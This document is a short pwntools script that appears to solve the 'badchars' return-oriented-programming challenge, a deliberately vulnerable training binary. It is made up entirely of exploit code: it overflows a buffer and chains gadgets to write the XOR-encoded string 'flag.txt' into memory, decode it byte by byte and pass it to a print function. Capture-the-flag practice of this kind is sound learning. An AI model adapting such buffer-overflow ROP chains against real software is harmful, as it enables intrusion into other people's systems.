from pwn import *
p = process("./badchars")

payload  = b"A"*0x28
payload += p64(0x40069c) + p64(u64(b"dnce,vzv")) + p64(0x601038) + p64(0) + p64(0) + p64(0x400634)
for i in range(8):
    payload += p64(0x4006a0) + p64(2) + p64(0x601038+i) + p64(0x400628)
payload += p64(0x4006a3) + p64(0x601038) + p64(0x400510)


p.sendline(payload)
p.interactive()
